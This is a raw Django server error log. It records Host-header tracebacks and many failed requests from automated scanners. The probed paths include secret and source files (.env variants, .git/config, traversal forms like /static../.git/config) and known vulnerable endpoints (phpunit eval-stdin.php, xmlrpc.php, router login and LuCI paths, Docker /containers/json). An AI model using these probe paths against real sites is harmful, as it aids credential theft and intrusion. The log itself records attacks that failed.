    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Bad Request: /HNAP1
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Bad Request: /evox/about
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /phpmyadmin/index.php
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /actuator/gateway/routes
Not Found: /.git/index
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /_profiler/phpinfo
Not Found: /libs/js/iframe.js
Not Found: /config.json
Not Found: /assets../.git/config
Not Found: /.env.live
Not Found: /.git/HEAD
Not Found: /actuator/health
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /_profiler/phpinfo
Not Found: /phpinfo.php
Not Found: /phpinfo
Not Found: /info.php
Not Found: /php-info.php
Not Found: /phpinfoposmeta.php
Not Found: /dashboard/phpinfo.php
Not Found: /ppinfo.php
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /api/bin/123123
Not Found: /portal/redlion
Not Found: /webui/
Not Found: /geoserver/web/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/refs/
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /index.html
Not Found: /_profiler/phpinfo
Not Found: /.git/config
Not Found: /phpmyadmin/index.php
Not Found: /api/bin/123123
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.env
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wILP
Not Found: /jquery-3.3.1.min.js
Not Found: /robots.txt
Not Found: /index.html
Not Found: /phpmyadmin/index.php
Not Found: /.env.development.local
Not Found: /.env.stage
Not Found: /.env.testing
Not Found: /.env.uat
Not Found: /static../.git/config
Not Found: /.env.backup
Not Found: /.git/config
Not Found: /src/.git/config
Not Found: /.env.dev
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /containers/json
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /api/bin/123123
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/config
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/refs/heads/
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/index.html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /contact/contact.html
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /libs/js/iframe.js
Not Found: /index.html
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /.git/HEAD
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.git/refs/tags/
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /robots.txt
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /staging_environment/.git/config
Not Found: /deploy/.git/config
Not Found: /.git/config
Not Found: /robots.txt
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /actuator/gateway/routes
Not Found: /phpmyadmin/index.php
Not Found: /.git/refs/remotes/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /sitemap
Not Found: /sitemap
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /containers/json
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /sitemap
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /sitemap
Not Found: /.git/refs/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /sitemap
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /youtube-video-downloader/contact.html/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /boaform/admin/formLogin
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /api/bin/123123
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /api/.git/config
Not Found: /.env.preprod
Not Found: /static../.git/config
Not Found: /.env.dist
Not Found: /server/.git/config
Not Found: /api/.env
Not Found: /.env.template
Not Found: /.env.uat
Not Found: /project/.git/config
Not Found: /.env.ci
Not Found: /.env.live
Not Found: /.env.local
Not Found: /.env.stage
Not Found: /settings/.env
Not Found: /data/.git/config
Not Found: /media../.git/config
